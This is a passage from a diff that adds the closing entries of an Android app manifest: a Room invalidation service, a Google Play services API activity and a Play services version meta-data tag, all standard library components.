+        <service android:directBootAware="true" android:exported="false" android:name="androidx.room.MultiInstanceInvalidationService"/>
+        <activity android:exported="false" android:name="com.google.android.gms.common.api.GoogleApiActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <meta-data android:name="com.google.android.gms.version" android:value="@integer/google_play_services_version"/>
+    </application>
+</manifest>
